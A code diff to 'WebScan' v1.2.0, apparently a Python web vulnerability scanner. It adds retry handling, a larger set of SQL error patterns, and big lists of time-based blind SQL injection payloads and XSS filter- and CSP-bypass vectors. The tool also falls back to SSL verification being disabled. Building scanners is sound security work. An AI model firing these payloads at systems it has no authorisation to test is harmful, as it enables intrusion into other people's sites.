@@ -36,17 +36,37 @@ from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
 
 # Try to import trafilatura for better content extraction
+TRAFILATURA_AVAILABLE = False
 try:
     import trafilatura
     TRAFILATURA_AVAILABLE = True
 except ImportError:
-    TRAFILATURA_AVAILABLE = False
+    # Trafilatura is optional - can still function without it
+    pass
+
+# Try to import additional optional modules for enhanced functionality 
+# These are not required but can improve scanning capabilities
+DNS_AVAILABLE = False
+try:
+    import dns.resolver
+    DNS_AVAILABLE = True
+except ImportError:
+    pass
+
+SELENIUM_AVAILABLE = False
+try:
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.common.by import By
+    SELENIUM_AVAILABLE = True
+except ImportError:
+    pass
 
 # Initialize colorama for colored terminal output
 init(autoreset=True)
 
 # Global variables
-VERSION = "1.1.0"
+VERSION = "1.2.0"
 USER_AGENT = f"WebScan/{VERSION}"
 SCAN_INTERRUPTED = False
 
@@ -66,15 +86,15 @@ class ScanArgs:
         
         # Optional parameters
         self.user_agent = USER_AGENT       # User-Agent string
-        self.custom_headers = {'User-Agent': USER_AGENT}  # Custom headers
-        self.show_progress = False         # Show progress
-        self.save_state = False            # Save state for resume
-        self.risk_threshold = 1.0          # Risk threshold
-        self.aggressive = False            # Aggressive mode
+        self.custom_headers = {'User-Agent': USER_AGENT}  # Custom HTTP headers
+        self.show_progress = False         # Show progress indicator
+        self.save_state = False            # Save scan state periodically
+        self.risk_threshold = 1.0          # Risk threshold for reporting
+        self.aggressive = False            # Aggressive scanning mode
         self.quiet = False                 # Quiet mode
-        self.json = False                  # JSON output
-        self.target_list = ''              # Target list file
-        self.resume = ''                   # Resume file
+        self.json = False                  # Output results as JSON
+        self.target_list = ''              # File with list of targets
+        self.resume = ''                   # Resume from state file
 DEFAULT_TIMEOUT = 10
 SCAN_RESUME_DATA = {}
 PROGRESS_LOCK = threading.Lock()
@@ -138,32 +158,102 @@ def setup_logger(log_file='webscan.log', level=logging.INFO, no_color=False):
     
     return logger
 
-def is_url_accessible(url, timeout=10, user_agent=USER_AGENT):
-    """Check if a URL is accessible."""
+def is_url_accessible(url, timeout=10, user_agent=USER_AGENT, retry_count=2, logger=None):
+    """
+    Check if a URL is accessible with retry mechanism and better error handling.
+    
+    Args:
+        url (str): URL to check
+        timeout (int): Request timeout in seconds
+        user_agent (str): User-Agent header value
+        retry_count (int): Number of retries on failure
+        logger: Optional logger instance
+        
+    Returns:
+        bool: True if URL is accessible, False otherwise
+    """
     headers = {
         'User-Agent': user_agent
     }
     
+    # Try to parse URL first to validate format
     try:
-        response = requests.head(
-            url, 
-            headers=headers, 
-            timeout=timeout,
-            allow_redirects=True
-        )
+        parsed_url = urlparse(url)
+        if not parsed_url.netloc:
+            if logger:
+                logger.error(f"Invalid URL format: {url}")
+            return False
+    except Exception as e:
+        if logger:
+            logger.error(f"URL parsing error: {url} - {str(e)}")
+        return False
         
-        # If HEAD request fails, try GET
-        if response.status_code >= 400:
-            response = requests.get(
+    # Attempt connection with retry
+    for attempt in range(retry_count + 1):
+        try:
+            # First try HEAD request (faster)
+            response = requests.head(
                 url, 
                 headers=headers, 
                 timeout=timeout,
-                allow_redirects=True
+                allow_redirects=True,
+                verify=True  # Verify SSL certificates
             )
+            
+            # If HEAD request fails, try GET
+            if response.status_code >= 400:
+                response = requests.get(
+                    url, 
+                    headers=headers, 
+                    timeout=timeout,
+                    allow_redirects=True,
+                    verify=True,  # Verify SSL certificates
+                    stream=True   # Stream to avoid downloading entire content
+                )
+                # Close the connection to free resources
+                response.close()
+            
+            return response.status_code < 400
+            
+        except requests.exceptions.SSLError as e:
+            # Retry without SSL verification as a fallback
+            if logger:
+                logger.warning(f"SSL error for {url}, retrying without verification: {str(e)}")
+            try:
+                response = requests.get(
+                    url, 
+                    headers=headers, 
+                    timeout=timeout,
+                    allow_redirects=True,
+                    verify=False,  # Skip SSL verification on retry
+                    stream=True
+                )
+                response.close()
+                return response.status_code < 400
+            except Exception as inner_e:
+                if logger:
+                    logger.error(f"Error accessing {url} without SSL verification: {str(inner_e)}")
+                
+        except requests.exceptions.ConnectionError:
+            # Connection refused or similar network errors
+            if logger and attempt == retry_count:
+                logger.error(f"Connection error for {url} after {retry_count} retries")
+            
+        except requests.exceptions.Timeout:
+            # Request timed out
+            if logger and attempt == retry_count:
+                logger.error(f"Request timeout for {url} after {retry_count} retries")
+            
+        except Exception as e:
+            # Other errors
+            if logger and attempt == retry_count:
+                logger.error(f"Error accessing {url}: {str(e)}")
         
-        return response.status_code < 400
-    except Exception:
-        return False
+        # Only sleep between retries, not after the last attempt
+        if attempt < retry_count:
+            time.sleep(1)  # Wait before retrying
+    
+    return False
 
 # Progress indicator class for long-running scans
 class ProgressIndicator:
@@ -470,6 +560,19 @@ class Reporter:
         Returns:
             str: Path to the generated report file
         """
+        # Count vulnerabilities by severity
+        severity_counts = {
+            'Critical': 0,
+            'High': 0,
+            'Medium': 0,
+            'Low': 0,
+            'Info': 0
+        }
+        
+        for vuln in self.vulnerabilities:
+            severity = vuln.get('severity', 'Info')
+            severity_counts[severity] = severity_counts.get(severity, 0) + 1
+        
         # Ensure start_time is valid before formatting
         start_time_str = 'N/A'
         if self.start_time:
@@ -524,10 +627,11 @@ class Reporter:
         """
         try:
             with open(self.output_file, 'w') as f:
-                # Header
+                # Header with more detailed formatting
                 f.write("=" * 80 + "\n")
-                f.write(f"WebScan Vulnerability Report\n")
+                f.write(f"WebScan v{VERSION} - Advanced Vulnerability Report\n")
                 f.write(f"Developed by AMKUSH\n")
+                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                 f.write("=" * 80 + "\n\n")
                 
                 # Scan Information
@@ -743,33 +847,100 @@ class SQLInjectionScanner:
         ]
         
         # Error patterns indicating successful SQL injection
+        # Comprehensive SQL error patterns for aggressive real-world detection
         self.sql_error_patterns = [
+            # MySQL errors - expanded for more variants
             r"SQL syntax.*MySQL",
             r"Warning.*mysql_.*",
             r"MySQLSyntaxErrorException",
             r"valid MySQL result",
             r"check the manual that corresponds to your (MySQL|MariaDB) server version",
+            r"MySqlException",
+            r"MySqlClient\.",
+            r"com\.mysql\.jdbc",
+            r"Unclosed quotation mark after the character string",
+            r"Incorrect syntax near",
+            r"SQL syntax error",
+            r"mysql_fetch_array\(\)",
+            r"getimagesize\(\)",
+            r"mysqli_fetch_assoc\(\)",
+            r"You have an error in your SQL syntax",
+            
+            # Oracle errors - expanded
             r"ORA-[0-9][0-9][0-9][0-9]",
             r"Oracle error",
             r"Oracle.*Driver",
             r"Warning.*oci_.*",
+            r"Oracle.*ORA-[0-9]",
+            r"quoted string not properly terminated",
+            r"SQL command not properly ended",
+            
+            # SQL Server errors - expanded
             r"Microsoft SQL Server",
             r"ODBC SQL Server Driver",
             r"SQLServer JDBC Driver",
             r"SQLServerException",
+            r"Warning.*mssql_.*",
+            r"SQL Server.*error",
             r"Unclosed quotation mark after the character string",
+            r"Incorrect syntax near",
+            r"Line [0-9]*: Incorrect syntax near",
+            r"Syntax error converting the varchar value",
+            r"Conversion failed when converting",
+            r"SqlException",
+            r"SqlClient\.",
+            r"System\.Data\.SqlClient",
+            
+            # SQLite errors - expanded
             r"SQLITE_ERROR",
             r"SQLite/JDBCDriver",
             r"SQLite\.Exception",
             r"System\.Data\.SQLite\.SQLiteException",
+            r"Warning.*sqlite_.*",
+            r"\[SQLITE_ERROR\]",
+            r"SQLite3::query",
+            r"near \".*\": syntax error",
+            
+            # PostgreSQL errors - expanded
             r"PostgreSQL.*ERROR",
             r"Warning.*pg_.*",
             r"valid PostgreSQL result",
             r"Npgsql\.",
             r"PG::SyntaxError",
+            r"org\.postgresql\.util\.PSQLException",
+            r"Supplied argument is not a valid PostgreSQL result",
+            r"ERROR: syntax error at or near",
+            r"ERROR: unterminated quoted string at or near",
+            r"PSQLException",
+            
+            # DB2 and other errors
             r"DB2 SQL error",
             r"JDBC.*DB2",
-            r"CLI Driver.*DB2"
+            r"CLI Driver.*DB2",
+            r"SQLSTATE\[\d+\]",
+            r"Warning.*sybase.*",
+            r"DriverSapDB",
+            r"Sybase message",
+            r"\[IBM\]\[CLI Driver\]\[DB2/",
+            
+            # Generic SQL error patterns
+            r"SQL error.*PLS-[0-9][0-9][0-9][0-9]",
+            r"Warning.*SQL",
+            r"Error.*SQL",
+            r"SQL Error",
+            r"SQLState",
+            r"SQL statement",
+            r"JDBC.*SQL",
+            r"Unexpected end of SQL command",
+            r"Data type mismatch in criteria expression",
+            r"has occurred in the vicinity of:",
+            r"A syntax error has occurred",
+            r"ADODB\.Field",
+            r"ASP\.NET_SqlClient",
+            r"XPathException",
+            r"Warning.*safe_mysql",
+            r"Syntax error or access violation",
+            r"Procedure or function .* expects parameter"
         ]
         
         # Compile regex patterns
@@ -1077,34 +1248,78 @@ class SQLInjectionScanner:
         Returns:
             tuple: (is_vulnerable, payload, time_diff) or (False, None, 0) if not vulnerable
         """
-        # Database-specific time-based payloads
+        # Comprehensive database-specific time-based payloads for aggressive real-world detection
         time_payloads = [
-            # MySQL (shorter delays for better UX while maintaining detection)
+            # MySQL time-based payloads (using brief delays for faster scanning)
             "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
             "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
             "\" AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
             "') AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
             "1)) AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
+            "1' AND SLEEP(2)-- -",
+            "' AND SLEEP(2)-- -",
+            "\" AND SLEEP(2)-- -",
+            "1) AND SLEEP(2)-- -",
+            ") AND SLEEP(2)-- -",
+            "1 AND SLEEP(2)#",
+            "AND SLEEP(2)#",
+            "1' AND BENCHMARK(5000000,MD5(NOW()))-- -",
+            "' AND BENCHMARK(5000000,MD5(NOW()))-- -",
             
-            # PostgreSQL 
+            # PostgreSQL time-based payloads
             "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
             "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
             "\"; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
+            "1;SELECT pg_sleep(2)-- -",
+            ";SELECT pg_sleep(2)-- -",
+            "1'); SELECT pg_sleep(2)-- -",
+            "'); SELECT pg_sleep(2)-- -",
+            "1)); SELECT pg_sleep(2)-- -",
             
-            # SQL Server
+            # SQL Server time-based payloads
             "1'; WAITFOR DELAY '0:0:2'-- -",
             "'; WAITFOR DELAY '0:0:2'-- -",
             "\"; WAITFOR DELAY '0:0:2'-- -",
             "1); WAITFOR DELAY '0:0:2'-- -",
             "'); WAITFOR DELAY '0:0:2'-- -",
+            "); WAITFOR DELAY '0:0:2'-- -",
+            ")); WAITFOR DELAY '0:0:2'-- -",
+            "1; WAITFOR DELAY '0:0:2'-- -",
+            "; WAITFOR DELAY '0:0:2'-- -",
             
-            # Oracle (using heavy queries for time delay)
+            # Oracle time-based payloads
             "1' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)-- -",
             "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)-- -",
+            "1' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2)-- -",
+            "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2)-- -",
+            "1' AND DBMS_PIPE.RECEIVE_MESSAGE(('A'),2) IS NULL-- -",
+            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('A'),2) IS NULL-- -",
             
-            # SQLite (using heavy queries for time delay)
+            # SQLite time-based payloads
             "1' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -",
-            "' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -"
+            "' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -",
+            "1' AND randomblob(100000000) AND '1'='1",
+            "' AND randomblob(100000000) AND '1'='1",
+            
+            # Nested queries with conditional logic (works across multiple DBMS)
+            "1' AND IF(1=1, SLEEP(2), 0)-- -",
+            "' AND IF(1=1, SLEEP(2), 0)-- -",
+            "1'; IF(1=1) WAITFOR DELAY '0:0:2'-- -",
+            "'; IF(1=1) WAITFOR DELAY '0:0:2'-- -",
+            "1' AND (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(2)) ELSE 1 END)-- -",
+            "' AND (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(2)) ELSE 1 END)-- -",
+            
+            # Advanced stacked queries (works if stacked queries are allowed)
+            "1'; SELECT SLEEP(2)-- -",
+            "'; SELECT SLEEP(2)-- -",
+            "1\"; SELECT SLEEP(2)-- -",
+            "\"; SELECT SLEEP(2)-- -",
+            
+            # Context-specific time-based payloads
+            "1' OR (SELECT 1 FROM (SELECT SLEEP(2))A)-- -",  # WHERE clauses
+            "1 OR (SELECT 1 FROM (SELECT SLEEP(2))A)",       # Numeric contexts
+            "' UNION SELECT IF(1=1,SLEEP(2),0)-- -",         # UNION queries
+            "1' OR IF(1=1,SLEEP(2),0)-- -"                   # OR conditions
         ]
         
         is_form = form_details is not None and input_field is not None
@@ -1422,45 +1637,99 @@ class XSSScanner:
         self.logger = logger
         self.verbose = verbose
         
-        # XSS payloads with different bypass techniques
+        # Comprehensive collection of real-world XSS payloads for aggressive detection
         self.payloads = [
-            # Basic XSS detection
+            # Basic XSS detection vectors
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "<svg onload=alert('XSS')>",
             
-            # Filter bypass XSS
+            # Advanced filter bypasses - encodings and obfuscation
             "<img src=x onerror=alert`XSS`>",
             "<body onload=alert('XSS')>",
             "<svg/onload=alert('XSS')>",
             "<svg><script>alert('XSS')</script>",
-            
-            # More advanced bypasses
-            "<img src=x onerror=\"alert('XSS')\">",
+            "<img src=x onerror=\"\\x61\\x6C\\x65\\x72\\x74('XSS')\">", # Hex encoding
+            "<iframe srcdoc=\"<script>alert('XSS');</script>\">",
+            "<<script>alert('XSS');//<</script>",
+            "<script>a\\u006Cert('XSS')</script>", # Unicode escape
             "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">" ,
+            
+            # Polyglot XSS payloads - work in multiple contexts
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
             "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
             + "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->"
             + "<script>alert(String.fromCharCode(88,83,83))</script>",
             
-            # DOM XSS vectors
+            # DOM XSS vectors - protocol handlers and data URIs
             "javascript:alert('XSS')",
-            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
-
-            # Event handlers
+            "javascript:alert(1)//",
+            "javascript://comment%0Aalert('XSS')",
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", # base64 <script>alert('XSS')</script>
+            "data:application/javascript,alert('XSS')",
+            
+            # Event handlers - comprehensive collection
             "<div onmouseover=\"alert('XSS')\">hover me</div>",
             "<iframe onload=\"alert('XSS')\"></iframe>",
             "<details open ontoggle=\"alert('XSS')\">",
+            "<select autofocus onfocus=alert('XSS')>",
+            "<marquee onstart=alert('XSS')>",
+            "<video autoplay onplay=\"alert('XSS')\"><source src=\"x\"></video>",
+            "<audio autoplay onplay=\"alert('XSS')\"><source src=\"x\" type=\"audio/mp3\"></audio>",
+            "<input autofocus onfocus=\"alert('XSS')\">",
+            "<keygen autofocus onfocus=\"alert('XSS')\">",
             
-            # Context-specific payloads
+            # Context-specific payloads - attribute and tag context escapes
             "\"></span><script>alert('XSS')</script>",
             "\"onmouseover=\"alert('XSS')\"",
             "\"style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"alert('XSS')\"",
-            "'; alert('XSS')",
+            "\"><script>alert('XSS')</script><\"", # Breaking out of tags
+            "'><script>alert('XSS')</script>",
+            "';alert('XSS')",
             "\"-alert('XSS')-\"",
+            "'-confirm('XSS')-'",
+            "</script><script>alert('XSS')</script>", # Closing open script tags
+            "</title><script>alert('XSS');</script>", # Escaping title tags
+            "></plaintext><script>alert('XSS');</script>", # plaintext context
+            "\\x27\\x3balert('XSS')\\x27", # Hex encoded attribute injections
+            
+            # CSS-based XSS
+            "<style>@import 'javascript:alert(\"XSS\")';</style>",
+            "<style>body{background-image:url('javascript:alert(\"XSS\")')}</style>",
+            "<link rel=stylesheet href='javascript:alert(\"XSS\")'>",
+            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
+            "<div style=\"behavior: url(javascript:alert('XSS'))\">",
+            
+            # HTML5 vectors
+            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">XSS</maction></math>",
+            "<form><button formaction=javascript:alert('XSS')>XSS</button>",
+            "<isindex type=image src=1 onerror=alert('XSS')>",
+            "<object data=\"javascript:alert('XSS')\"></object>",
+            "<embed src=\"javascript:alert('XSS')\"></embed>",
             
             # CSP bypass attempts
             "<script src=\"data:;base64,YWxlcnQoJ1hTUycpIj48L3NjcmlwdD4=\"></script>",
             "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
+            "<script>setTimeout('alert(\"XSS\")',0)</script>",
+            "<script>Function('alert(\"XSS\")')();</script>",
+            "<script>new Function('alert(\"XSS\")')();</script>",
+            "<script>(()=>{return this})().alert('XSS')</script>", # Global object access
+            
+            # AngularJS template injection
+            "{{constructor.constructor('alert(\"XSS\")')()}}",
+            "<div ng-app ng-csp><div ng-click=$event.view.alert('XSS')>click me</div></div>",
+            
+            # Exotic vectors - using frames, scripts with src 
+            "<iframe src=javascript:alert('XSS')></iframe>",
+            "<script src=data:text/javascript,alert('XSS')></script>",
+            "<input type=\"text\" value=\"\" autofocus onfocus=alert('XSS')>",
+            
+            # Advanced mutations for filter evasion
+            "<sCr\u0130pt>alert('XSS')</scRipt>", # Unicode case manipulation
+            "<a href=\"j&#97;v&#97;script&#x3A;alert('XSS')\">Click</a>", # URL encoding with hex
+            "<svg><animate xlink:href=#test attributeName=href values=javascript:alert('XSS') /></svg>",
+            "<svg><animate attributeName=href values=javascript:alert('XSS') /><a id=test>Click</a>",
+            "<svg><set attributeName=href onbegin=alert('XSS')></set>",
         ]
         
         # Reflective XSS detection strings (with unique markers)
@@ -1530,51 +1799,156 @@ class XSSScanner:
     
     def _is_xss_successful(self, response_text, payload):
         """
-        Check if an XSS attempt was successful by analyzing the response.
+        Check if XSS payload was successfully injected using multiple detection methods.
+        Uses aggressive real-world techniques to determine if the payload would execute.
         
         Args:
             response_text (str): The response HTML content
             payload (str): The XSS payload sent
             
         Returns:
-            bool: True if XSS payload was reflected without encoding/filtering, False otherwise
+            bool: True if XSS is successful, False otherwise
         """
-        # Check for exact payload reflection
-        if payload in response_text:
-            # Verify the payload isn't just echoed as text content by checking for HTML context
-            # For script tags, check if they remain intact
-            if "<script>" in payload:
-                return "<script>" in response_text
-            
-            # For img/svg tags with event handlers, make sure the tag and handler are preserved
-            if "<img" in payload and "onerror" in payload:
-                return "<img" in response_text and "onerror" in response_text
-            
-            if "<svg" in payload and "onload" in response_text:
-                return "<svg" in response_text and "onload" in response_text
-            
-            # Check for JavaScript event handlers
-            if "onmouseover" in payload or "onclick" in payload or "onload" in payload:
-                event_handler = next((h for h in ["onmouseover", "onclick", "onload"] if h in payload), None)
-                return event_handler in response_text and "alert" in response_text
-            
-            # If we have JavaScript protocol or data URI
-            if "javascript:" in payload or "data:text/html" in payload:
-                return "javascript:" in response_text or "data:text/html" in response_text
-            
-            # Fallback - exact payload is present, so we consider it potentially vulnerable
-            return True
+        # Convert response to soup for advanced context analysis
+        soup = BeautifulSoup(response_text, 'html.parser')
         
-        # Check if the payload was filtered but still potentially dangerous
-        # For example, if alert() is present but script tags were removed
-        if "alert" in payload:
-            if "alert" in response_text and "XSS" in response_text:
-                # Check if it's not just displayed as text in a pre/code block or attribute
-                soup = BeautifulSoup(response_text, 'html.parser')
-                for tag in soup.find_all(string=re.compile(r'alert.*XSS')):
-                    parent = tag.parent.name
-                    if parent not in ['pre', 'code', 'textarea']:
+        # Check for exact payload reflection - basic detection
+        if payload in response_text:
+            # Check if the payload is in a script tag - this is an immediate win for XSS
+            for script in soup.find_all('script'):
+                if payload in script.text:
+                    # Check if the payload is actually part of a string literal
+                    # If it's not properly escaped inside JavaScript, it's definitely vulnerable
+                    script_content = script.text
+                    if '"' + payload + '"' not in script_content and "'" + payload + "'" not in script_content:
+                        # The payload is not enclosed in quotes, suggesting it's part of the code
                         return True
+                    else:
+                        # Even if enclosed in quotes, check if quotes can be escaped
+                        if any(x in payload for x in ['"', "'"]) and any(x in script_content for x in [payload.replace('"', '\\"'), payload.replace("'", "\\'")]):
+                            return False  # Payload is properly escaped
+                        return True  # Potentially exploitable
+            
+            # Check for HTML tag context - determine if tags remain unfiltered
+            if "<script>" in payload:
+                return "<script>" in response_text and not payload.replace("<", "&lt;").replace(">", "&gt;") in response_text
+            
+            # For img/svg tags with event handlers, verify real-world execution potential
+            if "<img" in payload and "onerror" in payload:
+                # Check if the attribute is properly attached to the tag, not just text
+                img_tags = soup.find_all('img')
+                for tag in img_tags:
+                    if tag.has_attr('onerror') and 'alert' in tag['onerror']:
+                        return True
+            
+            if "<svg" in payload and "onload" in payload:
+                svg_tags = soup.find_all('svg')
+                for tag in svg_tags:
+                    if tag.has_attr('onload') and 'alert' in tag['onload']:
+                        return True
+            
+            # Enhanced detection for event handlers - verify they're in correct context
+            event_handlers = ["onmouseover", "onclick", "onload", "onerror", "ontoggle"]
+            for handler in event_handlers:
+                if handler in payload:
+                    # Find all elements with this event handler
+                    for tag in soup.find_all(attrs={handler: True}):
+                        if 'alert' in tag[handler]:
+                            return True
+            
+            # Check for JavaScript protocol handlers - often bypasses filters
+            if "javascript:" in payload:
+                for tag in soup.find_all('a'):
+                    if tag.has_attr('href') and 'javascript:' in tag['href']:
+                        return True
+            
+            # Data URI scheme - another common bypass technique
+            if "data:text/html" in payload:
+                for tag in soup.find_all(['a', 'iframe', 'embed', 'object', 'frame']):
+                    for attr in ['src', 'href', 'data']:
+                        if tag.has_attr(attr) and 'data:text/html' in tag[attr]:
+                            return True
+        
+        # Advanced context analysis - look for DOM XSS potential
+        # Look for our payload being passed to dangerous DOM manipulation functions
+        for script in soup.find_all('script'):
+            script_content = script.text.lower()
+            dangerous_dom_funcs = [
+                'document.write', 'innerHTML', 'outerHTML', 'insertAdjacentHTML',
+                'eval(', 'setTimeout(', 'setInterval(', 'new Function(', 
+                'document.createElement', 'document.location', 'location.href'
+            ]
+            
+            # Check for both dangerous functions and any part of our payload
+            # Finding both suggests potential DOM XSS
+            if any(func in script_content for func in dangerous_dom_funcs):
+                # Extract the payload core elements (alert, XSS mentions)
+                if 'alert' in payload and 'alert' in script_content:
+                    for func in dangerous_dom_funcs:
+                        # Check for patterns like: dangerous_func(...payload...)
+                        pattern = f"{func}.*alert.*xss"
+                        if re.search(pattern, script_content, re.IGNORECASE):
+                            return True
+        
+        # Advanced attribute context detection - checking for real-world injection points
+        if '="' in payload or "='" in payload or '>' in payload or '<' in payload or '"' in payload or "'" in payload:
+            # This could be a quotation mark escape or tag closing attempt
+            for tag in soup.find_all():
+                for attr, value in tag.attrs.items():
+                    if isinstance(value, str) and payload in value:
+                        # Check if we're in a JavaScript event handler attribute (highest risk)
+                        if attr.lower().startswith('on'):
+                            return True
+                        
+                        # Check for style attribute with JavaScript execution vectors
+                        if attr.lower() == 'style' and ('expression' in value.lower() or 'url(' in value.lower()):
+                            return True
+                            
+                        # Check for src/href attributes with javascript: protocol
+                        if attr.lower() in ['src', 'href', 'formaction', 'action'] and 'javascript:' in value.lower():
+                            return True
+                        
+                        # Check if we've broken out of the attribute with quotes
+                        if '"' in payload or "'" in payload:
+                            # Look for patterns where our quotes have escaped the attribute
+                            # More comprehensive pattern matching for various context breaks
+                            patterns = [
+                                f'[^=]"{payload}|{payload}"[^>]',  # Basic quote break
+                                f'[^=]\'{payload}|{payload}\'[^>]',  # Single quote break
+                                f'{payload}"><',  # Quote and angle bracket to start a new tag
+                                f'{payload}\'><',  # Single quote and angle bracket
+                                f'"{payload}"',    # Clean injection inside double quotes
+                                f'\'{payload}\''   # Clean injection inside single quotes
+                            ]
+                            
+                            for pattern in patterns:
+                                if re.search(pattern, response_text, re.IGNORECASE):
+                                    return True
+                        
+                        # Check for HTML encoded attribute breaks (hex/decimal encoding)
+                        encoded_patterns = [
+                            r'&#34;' + payload,  # Decimal HTML entity for quote
+                            r'&#39;' + payload,  # Decimal HTML entity for apostrophe
+                            r'&#x22;' + payload, # Hex HTML entity for quote
+                            r'&#x27;' + payload  # Hex HTML entity for apostrophe
+                        ]
+                        
+                        for pattern in encoded_patterns:
+                            if pattern in response_text:
+                                return True
+        
+        # Advanced detection for filtered/encoded payloads
+        if "alert" in payload and "XSS" in payload:
+            if "alert" in response_text and "XSS" in response_text:
+                # If alert and XSS appear anywhere, we need to check the context carefully
+                for tag in soup.find_all(string=re.compile(r'alert.*XSS', re.IGNORECASE)):
+                    parent = tag.parent.name
+                    # Check if it's not just displayed as text in a safe context
+                    if parent not in ['pre', 'code', 'textarea']:
+                        # Check if it's in a different node than just text
+                        if parent in ['script', 'style'] or (hasattr(tag.parent, 'attrs') and 
+                                                            any(a.startswith('on') for a in tag.parent.attrs)):
+                            return True
         
         return False
     
@@ -4195,14 +4569,23 @@ class InfoDisclosureScanner:
         
         # Compile all regex patterns
         for key, info in self.patterns.items():
-            info['compiled'] = re.compile(info['regex'], re.IGNORECASE | re.MULTILINE)
-            # Store original regex string for later use
+            # Store original regex string first
             info['regex_str'] = info['regex']
+            # Then compile it and store the pattern directly for use
+            try:
+                pattern = re.compile(info['regex'], re.IGNORECASE | re.MULTILINE)
+                info['compiled'] = pattern
+            except Exception as e:
+                if self.logger:
+                    self.logger.error(f"Error compiling regex pattern '{info['regex']}': {str(e)}")
+                # Create a fallback pattern that won't match anything
+                info['compiled'] = re.compile(r'a^', re.IGNORECASE | re.MULTILINE)
     
     def _extract_page_content(self, url):
         """
         Extract the content of a webpage using trafilatura if available,
-        otherwise just use the raw HTML.
+        otherwise just use the raw HTML. Handles various errors and includes
+        retry mechanism for more reliable content extraction.
         
         Args:
             url (str): The URL to extract content from
@@ -4210,27 +4593,99 @@ class InfoDisclosureScanner:
         Returns:
             tuple: (raw_html, extracted_text) or (None, None) if error
         """
-        try:
-            response = requests.get(url, headers=self.headers, timeout=self.timeout)
-            if response.status_code != 200:
-                return None, None
-            
-            raw_html = response.text
-            
-            # Try to extract main content using trafilatura if available
-            extracted_text = None
-            if TRAFILATURA_AVAILABLE:
+        retry_count = 2
+        
+        for attempt in range(retry_count + 1):
+            try:
+                # Use stream=True to avoid downloading entire content before checking status code
+                response = requests.get(
+                    url, 
+                    headers=self.headers, 
+                    timeout=self.timeout,
+                    stream=True,
+                    verify=True
+                )
+                
+                # Check status code first before downloading content
+                if response.status_code != 200:
+                    if self.logger and self.verbose:
+                        self.logger.debug(f"Got status code {response.status_code} from {url}")
+                    response.close()  # Close connection to free resources
+                    return None, None
+                
+                # Only read response content if status code is good
+                raw_html = response.text
+                
+                # Try to extract main content using trafilatura if available
+                extracted_text = None
+                if TRAFILATURA_AVAILABLE:
+                    try:
+                        # Make sure to access the global trafilatura module
+                        import trafilatura as traf
+                        extracted_text = traf.extract(raw_html)
+                        
+                        # If trafilatura failed to extract anything useful
+                        if not extracted_text:
+                            # Try with additional options
+                            extracted_text = traf.extract(
+                                raw_html,
+                                include_comments=False,
+                                include_tables=True,
+                                no_fallback=False
+                            )
+                    except Exception as traf_error:
+                        # Log error but continue with raw HTML
+                        if self.logger and self.verbose:
+                            self.logger.debug(f"Trafilatura error: {str(traf_error)}")
+                
+                # Extract title or meta information when possible
                 try:
-                    extracted_text = trafilatura.extract(raw_html)
+                    soup = BeautifulSoup(raw_html, 'html.parser')
+                    page_title = soup.title.string if soup.title else None
+                    if self.logger and self.verbose and page_title:
+                        self.logger.debug(f"Page title: {page_title}")
                 except Exception:
                     pass
+                    
+                return raw_html, extracted_text
+                
+            except requests.exceptions.SSLError as e:
+                # SSL errors might require retry without verification
+                if self.logger and attempt == retry_count:
+                    self.logger.error(f"SSL error extracting content from {url}: {str(e)}")
+                if attempt < retry_count:
+                    try:
+                        # Retry without SSL verification
+                        response = requests.get(
+                            url, 
+                            headers=self.headers, 
+                            timeout=self.timeout,
+                            verify=False,  # Skip SSL verification on retry
+                            stream=True
+                        )
+                        raw_html = response.text
+                        response.close()
+                        return raw_html, None  # Return without trafilatura extraction
+                    except Exception:
+                        pass
+                    
+            except requests.exceptions.ConnectionError:
+                if self.logger and attempt == retry_count:
+                    self.logger.error(f"Connection error for {url}")
+                
+            except requests.exceptions.Timeout:
+                if self.logger and attempt == retry_count:
+                    self.logger.error(f"Request timeout for {url}")
+                
+            except Exception as e:
+                if self.logger and attempt == retry_count:
+                    self.logger.error(f"Error extracting content from {url}: {str(e)}")
             
-            return raw_html, extracted_text
-        
-        except Exception as e:
-            if self.logger:
-                self.logger.error(f"Error extracting content from {url}: {str(e)}")
-            return None, None
+            # Wait between retries
+            if attempt < retry_count:
+                time.sleep(1)
+                    
+        return None, None
     
